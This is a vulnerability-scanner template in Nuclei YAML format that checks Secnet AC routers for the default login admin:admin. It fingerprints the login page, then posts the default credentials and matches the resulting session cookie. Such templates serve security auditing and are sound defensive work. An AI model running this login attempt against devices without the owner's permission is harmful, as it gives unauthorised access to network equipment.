id: poc-yaml-secnet-ac-default-password
info:
  name: Secnet Ac Default Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    This template checks for default credentials (admin:admin) on Secnet Ac devices.

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /login.html HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<title>安网科技-智能路由系统</title>"

  - raw:
      - |
        POST /login.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user=admin&password=admin

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "Set-Cookie"
          - "ac_userid=admin,ac_passwd="
      - type: word
        part: body
        words:
          - "window.open('index.htm?_"
